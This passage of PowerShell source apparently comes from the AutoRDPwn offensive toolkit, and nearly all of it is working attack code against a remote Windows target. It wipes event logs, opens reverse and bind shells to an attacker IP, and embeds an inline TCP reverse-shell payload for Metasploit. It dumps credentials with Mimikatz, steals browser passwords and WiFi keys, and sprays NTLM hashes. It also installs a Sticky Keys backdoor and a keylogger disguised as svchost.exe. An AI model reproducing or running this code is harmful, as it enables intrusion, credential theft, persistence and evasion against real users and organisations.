        return
    }
    $creation = Invoke-Command -Session $session -ScriptBlock {
        (Get-CimInstance -ClassName Win32_ShadowCopy -List).Create('C:\', 'ClientAccessible')
    } -ErrorAction Stop
    if ($creation.ReturnValue -ne 0) { throw ('Shadow copy creation returned ' + $creation.ReturnValue) }
    $newId = [string]$creation.ShadowID
    $created = @(Invoke-Command -Session $session -ArgumentList $newId -ScriptBlock {
        param($id)
        Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$id'" -ErrorAction Stop |
            Select-Object -Property Id, VolumeName, InstallDate, DeviceObject | Select-Object -First 1
    } -ErrorAction Stop)
    if ($created.Count -eq 0) { throw 'The new shadow copy was not found after creation.' }
    $linkPath = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $deviceObject = [string]$created[0].DeviceObject
    $exposed = Invoke-Command -Session $session -ArgumentList $linkPath, $deviceObject -ScriptBlock {
        param($link, $device)
        # Most builds already carry the GLOBALROOT prefix inside DeviceObject.
        if ($device.StartsWith('\\?\GLOBALROOT')) { $targetPath = $device }
        else { $targetPath = '\\?\GLOBALROOT' + $device }
        $output = & cmd.exe /c mklink /d $link $targetPath 2>&1
        return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
    } -ErrorAction Stop
    if ($exposed.ExitCode -ne 0) { throw ('mklink could not expose the shadow copy: ' + $exposed.Output) }
    # The link directory itself is cleanup's problem, never the shadow copy.
    $script:ARRemoteTempDirs.Add($linkPath)
    Write-ARSuccess ('Shadow copy ' + [string]$created[0].Id + ' exposed at ' + $linkPath)
    Set-ARStatus 'Shadow copies created and exposed' 'Ok'
}

function Invoke-ARAttackEventLogClear {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Event log clear'
    $session = Get-ARTargetSession
    $logs = @(
        'Application',
        'Security',
        'System',
        'Setup',
        'Windows PowerShell',
        'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-WinRM/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
    )
    Write-ARWarn ('Event logs to wipe on ' + $target + ': ' + ($logs -join ', '))
    if (-not $script:ARAssumeYes) {
        $answer = Read-ARValue 'Type YES to clear these event logs' ''
        if ($answer -cne 'YES') {
            Write-ARWarn 'Event logs kept: the confirmation did not read YES.'
            Set-ARStatus 'Event log clear cancelled' 'Warn'
            return
        }
    }
    Write-ARInfo 'Clearing event logs with wevtutil...'
    $results = @()
    foreach ($log in $logs) {
        $result = Invoke-Command -Session $session -ArgumentList $log -ScriptBlock {
            param($name)
            $output = wevtutil.exe cl $name 2>&1
            return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
        } -ErrorAction Stop
        $results += [pscustomobject]@{ Name = $log; ExitCode = $result.ExitCode }
    }
    $table = ($results | Format-Table -AutoSize | Out-String)
    Show-ARText $table
    $failures = @($results | Where-Object { $_.ExitCode -ne 0 })
    if ($failures.Count -gt 0) {
        $names = @($failures | ForEach-Object { [string]$_.Name + ' (exit ' + $_.ExitCode + ')' })
        Write-ARWarn ('Event logs not cleared: ' + ($names -join ', '))
        Set-ARStatus ('Event logs cleared with ' + $failures.Count + ' failure(s)') 'Warn'
        return
    }
    Set-ARStatus 'Event logs cleared' 'Ok'
}

if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPortProxyPorts = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { $script:ARModuleFiles = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPersistenceItems = New-Object System.Collections.Generic.List[object] }

function Reset-AROperatorPortProxies {
    if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { return }
    $records = @($script:ARPortProxyPorts.ToArray())
    if ($records.Count -eq 0) { return }
    foreach ($record in $records) {
        $listenPort = [string]$record
        $listenAddress = '0.0.0.0'
        $separator = $listenPort.IndexOf('|')
        if ($separator -ge 0) {
            $listenAddress = $listenPort.Substring($separator + 1)
            $listenPort = $listenPort.Substring(0, $separator)
        }
        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
        if ([string]::IsNullOrWhiteSpace($listenAddress)) { $listenAddress = '0.0.0.0' }
        try {
            & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=$listenAddress" 2>&1> $null
            if ($LASTEXITCODE -ne 0 -and $listenAddress -ne '0.0.0.0') {
                & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=0.0.0.0" 2>&1> $null
            }
            if ($LASTEXITCODE -ne 0) { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
        }
        catch { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
    }
    $script:ARPortProxyPorts.Clear()
}

function Remove-ARModuleArtifacts {
    if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { return }
    $paths = @($script:ARModuleFiles.ToArray())
    if ($paths.Count -eq 0) { return }
    try {
        if (Test-ARIsLocalTarget) {
            foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
        }
        elseif ($script:ARSession) {
            Invoke-Command -Session $script:ARSession -ArgumentList (, $paths) -ScriptBlock {
                param($items)
                foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
            } -ErrorAction Stop | Out-Null
        }
    }
    catch { Write-ARWarn ('Module artifact cleanup incomplete: ' + $_.Exception.Message) }
    finally { $script:ARModuleFiles.Clear() }

    # WMI subscriptions, run values and logon tasks do not live in the file
    # list above, so the persistence ledger rides out through the same gate:
    # entries recorded this session (and leftover shapes from interrupted
    # runs) are deleted while the target session is still open, before
    # Invoke-ARCleanup closes it.
    if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) {
        $persistedItems = @($script:ARPersistenceItems.ToArray())
        if ($persistedItems.Count -gt 0) {
            $null = Remove-ARPersistenceItems -Items $persistedItems -IncludeUnknown
        }
        $script:ARPersistenceItems.Clear()
    }
}

function Invoke-ARModulePipeShell {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
    Write-ARInfo 'Named pipe server started on the target.'
    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
    Set-ARStatus 'Named pipe shell closed' 'Ok'
}

function Invoke-ARModuleWinRsConsole {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $arguments = @("/r:$target")
    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
    & winrs.exe @arguments
    Set-ARStatus 'WinRS console closed' 'Ok'
}

function Invoke-ARModuleHttpRevShell {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($data, $address, $listenPort)
            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
            . ([scriptblock]::Create($source))
            Invoke-WebRev -ip $address -port $listenPort
        } -ArgumentList $encoded, $ip, $port | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
            param($data, $address, $listenPort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($payload, $remoteAddress, $remotePort)
                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
                . ([scriptblock]::Create($source))
                Invoke-WebRev -ip $remoteAddress -port $remotePort
            } -ArgumentList $payload, $address, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
    $server = Join-Path $script:ARTools 'server.exe'
    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
    & $server $ip $port
    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
}

function Invoke-ARModuleNetcatDirect {
    $target = Get-ARTargetComputer
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $listenPort)
            . $path
            Invoke-PowerShellTcp -Bind -Port $listenPort
        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
            param($path, $listenPort)
            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $localPort)
                . $script
                Invoke-PowerShellTcp -Bind -Port $localPort
            } -ArgumentList $path, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Remote Control Application'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
}

function Invoke-ARModuleNetcatReverse {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $address, $remotePort)
            . $path
            Start-Sleep -Seconds 5
            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
            param($path, $address, $remotePort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $remoteAddress, $targetPort)
                . $script
                Start-Sleep -Seconds 5
                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
            } -ArgumentList $path, $address, $remotePort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
    Set-ARStatus 'Reverse connection scheduled' 'Ok'
}

function Invoke-ARModuleMimikatzSam {
    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
    Show-ARText $result
    Set-ARStatus 'SAM dump finished' 'Ok'
}

function Invoke-ARModuleMimikatzLogon {
    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
    Show-ARText $result
    Set-ARStatus 'Logon password dump finished' 'Ok'
}

function Invoke-ARModuleSharpWeb {
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
    Show-ARText $result
    Set-ARStatus 'Browser password recovery finished' 'Ok'
}

function Invoke-ARModuleWifiKeys {
    $result = Invoke-ARTargetCommand -ScriptBlock {
        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
        try {
            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
            $lines = New-Object System.Collections.Generic.List[string]
            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                try {
                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
                    $name = [string]$xml.WLANProfile.name
                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
                } catch { }
            }
            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
            return ($lines -join "`n")
        }
        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Show-ARText $result
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARModulePortScan {
    $target = Get-ARTargetComputer
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
    if ($ports -notmatch '^\d+$') { $ports = '100' }
    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'Continue'
    try {
        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
    }
    finally { $ProgressPreference = $oldProgress }
    Set-ARStatus 'Port scan finished' 'Ok'
}

function Invoke-ARModulePortForward {
    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
    if (Test-ARIsLocalTarget) {
        $scriptBlock = {
            param($action, $lport, $lhost, $rport, $rhost)
            switch ($action) {
                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
                'show' { & netsh.exe interface portproxy show all }
                'reset' { & netsh.exe interface portproxy reset }
            }
        }
        if ($operation -eq '1' -or $operation -eq '2') {
            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
            & $scriptBlock 'add' $lport $lhost $rport $rhost
            $proxyRecord = $lport + '|' + $lhost
            if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        }
        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
        else { & $scriptBlock 'show' }
        Set-ARStatus 'Port forwarding updated' 'Ok'
        return
    }
    if ($operation -eq '1') {
        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        $proxyRecord = $lport + '|' + $lhost
        if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        Set-ARStatus 'Local port forwarding created' 'Ok'
        return
    }
    $parameters = @{}
    if ($operation -eq '2') {
        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        Invoke-ARTargetCommand -ScriptBlock {
            param($lport, $lhost, $rport, $rhost)
            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding created' 'Ok'
    }
    elseif ($operation -eq '4') {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding reset' 'Ok'
    }
    else {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding listed' 'Ok'
    }
}

function Invoke-ARModuleWebServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Start-WebServer -BINDING 'http://+:8080/'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Start-WebServer -BINDING 'http://+:8080/'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Web Server'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    $url = 'http://' + $target + ':8080/'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
    Write-Host $url -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try { Start-Process $url | Out-Null } catch { }
    Set-ARStatus 'Web server started' 'Ok'
}

function Invoke-ARModuleCredScan {
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
    $method = $method.ToLowerInvariant()
    if ($method -like 'pass*' -or $method -like 'contra*') {
        $plain = Read-ARSecret 'Password'
        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
        $hash = Get-NTLM $plain
    }
    else {
        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
    }
    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
    Set-ARStatus 'Credential scan finished' 'Ok'
}

function Invoke-ARModuleRdpCaching {
    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
    if (-not $script:ARModuleFiles.Contains($recovered)) { $script:ARModuleFiles.Add($recovered) }
    Write-ARSuccess ('Recovered images: ' + $recovered)
    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
    if (-not $script:ARInvokedFromOption) {
        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
    }
    Set-ARStatus 'RDP cache rebuilt' 'Ok'
}

function Invoke-ARModuleListUsers {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
    Show-ARText $result
    Set-ARStatus 'User enumeration finished' 'Ok'
}

function Invoke-ARModuleSessionGopher {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
    Show-ARText $result
    Set-ARStatus 'SessionGopher finished' 'Ok'
}

function Invoke-ARModuleStickyKeys {
    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
    Invoke-ARTargetCommand -ScriptBlock {
        $keys = @('sethc.exe', 'Utilman.exe')
        foreach ($key in $keys) {
            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
            New-Item -Path $path -Force | Out-Null
            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
        }
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
    } | Out-Null
    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
}

function Invoke-ARModuleMetasploit {
    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
    $template = @'
$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
'@
    $payload = $template -f $msfHost, $msfPort
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
            param($code)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
    Write-Host 'use exploit/multi/handler'
    Write-Host 'set payload windows/shell/reverse_tcp'
    Write-Host ('set LHOST ' + $msfHost)
    Write-Host ('set LPORT ' + $msfPort)
    Write-Host 'exploit'
    Set-ARStatus 'Metasploit payload started' 'Ok'
}

function Invoke-ARModuleKeylogger {
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHost = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHost, $second)
    if (Test-ARIsLocalTarget) {
        $dll = $localDll
        $hostProcess = $localHost
        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
        Push-Location $work
        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
        Start-Sleep -Milliseconds 500
        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
